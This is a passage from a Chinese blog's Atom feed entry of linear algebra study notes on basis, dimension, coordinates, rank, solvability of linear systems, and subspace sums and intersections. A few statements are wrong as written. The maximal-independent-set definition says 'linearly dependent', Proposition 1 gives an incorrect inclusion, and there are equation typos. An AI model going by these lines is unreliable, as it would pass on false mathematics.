rong>定义3</strong>：（有限维与无限维）</p><p>若$V$有一个基是有限子集，则称$V$是有限维的。</p><p>若$V$有一个基是无限子集，则称$V$是无限维的。</p><p><strong>定理2</strong>：</p><p>若$V$是有限维的，则$V$的任意两个基所含向量的个数相等。</p><p><strong>推论1</strong>：</p><p>若$V$是无限维的则$V$的任何一个基都是无限集。</p><p><strong>定义4</strong>：</p><p>设$V$是有限维的，则把$V$的一个基所含向量的个数称为线性空间的<strong>维数</strong>，记作$dim_k~V$或$dim~V$</p><p>若$V$是无限维的，则把$V$的维数记作$dim~V = \infty$</p><p>${0}$的维数为$0$（数0）</p><p><strong>命题1</strong>：</p><p>设$V$的$dim~V=n$，则$V$的任意$n+1$个向量都线性相关</p><p><strong>定义5</strong>：</p><p>设$dim~V=n$，则$V$中一个基$\alpha_1,…,\alpha_n$则$V$中任意向量$\alpha=a_1\alpha_1+…+a_n\alpha_n$，因为该表出方式唯一，所以把$\begin{pmatrix}a_1 \\vdots \a_n\end{pmatrix}$称为$\alpha_1,…,\alpha_n$下的坐标</p><p><strong>命题2</strong>：</p><p>设$dim~V=n$，则$V$中任意n个线性无关的向量都是$V$的一个基</p><p><strong>命题3</strong>：</p><p>设$dim~V=n$，如果$V$中每一个向量可以由向量组$\alpha_1,…,\alpha_n$线性表出，则$\alpha_1,…,\alpha_n$是$V$的一个基。</p><p><strong>命题4</strong>：</p><p>设$dim~V=n$，则$V$中任意一个线性无关的向量组都可以扩充成$V$的基。</p><p><strong>命题5</strong>：</p><p>设$dim~V=n$，$W$是$V$的一个子空间，则$dim~W≤dim~V$</p></blockquote><h1 id="向量空间的基-维数与坐标"><a href="#向量空间的基、维数与坐标" class="headerlink" title="向量空间的基、维数与坐标"></a>向量空间的基、维数与坐标</h1><ul><li>研究完抽象的线性空间的<code>基</code>、<code>维数</code>、<code>坐标</code>后接下来就来研究向量空间的基、维数与坐标。</li></ul><blockquote><p><strong>定义5</strong>：</p><p>设$V$是数域$K$上的线性空间，$V$的一个子集$S$如果满足：</p><ol><li>$S$是线性相关</li><li>对于$\beta∉S$（如果有的话），有$S\cup{\beta}$线性相关，那么称$S$是$V$的一个<strong>极大线性无关集</strong></li></ol><p>注解1：</p><p>$S$是$V$中的一个基$\Rightarrow$$S$是$V$的一个极大线性无关集</p><p>（当$V≠{0}$时）$S$是$V$的一个极大线性无关集$\Rightarrow$$S$是$V$中的一个基</p><p>注解2：</p><p>$\phi$是${0}$的一个极大线性无关组</p><p><strong>命题6</strong>：</p><p>$&lt;\alpha_1,…,\alpha_s&gt;:={k_1\alpha_1+…+k_s\alpha_s|k_1,…,k_s\in K}$，则$\alpha_1,…,\alpha_s$的一个极大线性无关组是$&lt;\alpha_1,…,\alpha_s&gt;$的一个基。</p><p>因此有$dim~&lt;\alpha_1,…,\alpha_s&gt;=rank{\alpha_1,…,\alpha_s}$</p></blockquote><h1 id="矩阵的秩"><a href="#矩阵的秩" class="headerlink" title="矩阵的秩"></a>矩阵的秩</h1><h1 id="线性方程组有解的判别定理"><a href="#线性方程组有解的判别定理" class="headerlink" title="线性方程组有解的判别定理"></a>线性方程组有解的判别定理</h1><blockquote><p><strong>定理1</strong>：</p><p>数域$K$上n元线性方程组假设这个n元线性方程组使用列向量与未知数表示，具体表示如下：$\alpha_1x_1+\alpha_2+x_2+….+\alpha_nx_n=\beta~~~(1)$有解</p><p>$\Longleftrightarrow \beta\in&lt;\alpha_1,…,\alpha_n&gt;$</p><p>$\Longleftrightarrow &lt;\alpha_1,…,\alpha_n,\beta&gt;=&lt;\alpha_1,…,\alpha_n&gt;$</p><p>$\Longleftrightarrow$$dim&lt;\alpha_1,….,\alpha_n,\beta&gt;=dim&lt;\alpha_1,….,\alpha_n&gt;$</p><p>$\Longleftrightarrow$增广矩阵$\tilde{A}$的秩=系数矩阵$A$的秩（最终结论）</p><p><strong>定理2</strong>：</p><p>数域$K$上$n$元线性方程组$(1)$有解时，如果它的系数矩阵$A$的秩等于$n$，那么方程组$(1)$有唯一解，如果$A$的秩小于$n$那么方程组$(1)$有无穷多个解。</p><p><strong>推论1</strong>：</p><p>数域$K$上n元齐次线性方程组有非零解的充分必要条件是：它的系数矩阵的秩小于未知量的个数$n$</p></blockquote><h1 id="齐次线性方程组解的结构"><a href="#齐次线性方程组解的结构" class="headerlink" title="齐次线性方程组解的结构"></a>齐次线性方程组解的结构</h1><h1 id="非齐次线性方程组解的结构"><a href="#非齐次线性方程组解的结构" class="headerlink" title="非齐次线性方程组解的结构"></a>非齐次线性方程组解的结构</h1><h1 id="线性子空间的运算"><a href="#线性子空间的运算" class="headerlink" title="线性子空间的运算"></a>线性子空间的运算</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p><img src="/2025/10/03/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%A9%BA%E9%97%B4/image-20251118082912933.png" alt="image-20251118082912933"></p><h2 id="线性子空间的交与和"><a href="#线性子空间的交与和" class="headerlink" title="线性子空间的交与和"></a>线性子空间的交与和</h2><blockquote><p><strong>定理2</strong>：线性子空间的交运算</p><p>设$V_1,V_2$都是域$F$上线性空间$V$的字空间，则$V_1\cap V_2$也是$V$的子空间。</p><p><strong>定理3</strong>：线性子空间交的运算律</p><ol><li>交换律：$V_1\cap V_2=V_2\cap V_1$</li><li>结合律：$(V_1\cap V_2)\cap V_3=V_1\cap(V_2\cap V_3)$</li><li>多个子空间的交：$\cap_{i=1}^{s}V_i:=V_1\cap V_2\cap…\cap V_s$</li></ol><p><strong>定理4</strong>：线性子空间的和运算</p><p>设$V_1,V_2$都是域$F$上线性空间$V$的子空间，则$V_1+V_2$是$V$的子空间。</p><p><strong>定理5</strong>：线性子空间和的运算律</p><ol><li>交换律：$V_1+V_2=V_2+V_1$</li><li>结合律：$(V_1+V_2)+V_3=V_1+(V_2+V_3)$</li><li>多个子空间的和：$\sum_{i=1}^{s} :=V_1+V_2+…+V_s$</li></ol><p><strong>命题1</strong>：线性子空间的交与和的关系</p><p>设$V_1,V_2$和$V_3$都是域$F$上线性空间$V$的子空间，则</p><ol><li>$V_1\cap (V_2+V_3)\supseteq (V_1+V_2)+(V_1\cap V_3)$</li><li>$V_1+(V_2\cap V_3)\subseteq (V_1+V_2)\cap(V_1+V_3)$</li></ol><p><strong>定理6</strong>：子空间的维数公式</p><p>设$V_1,V_2$都是域$F$上线性空间$V$的有限子空间，则$V_1\cap V_2,V_1+V_2$也是有限维的，并且</p><p>$dim~V_1+dim~V_2=dim(V_1+V_2)+dim(V_1\cap V_2)$</p><p><strong>推论1</strong>：</p><p>设$V_1,V_2$都是域$F$上线性空间$V$的有限维子空间，则</p><p>$dim(V_1+V_2)=dim~V_1+dim~V_2\Leftrightarrow V_1\cap V_2=0$</p></blockquote><h2 id="线性子空间的直和"><a href="#线性子空间的直和" class="headerlink" title="线性子空间的直和"></a>线性子空间的直和</h2><h1 id="线性空间同构映射"><a href="#线性空间同构映射" class="headerlink" title="线性空间同构映射"></a>线性空间同构映射</h1><h1 id="商空间"><a href="#商空间" class="headerlink" title="商空间"></a>商空间</h1>]]></content>
    
    
    <summary type="html">前言：无</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
</feed>
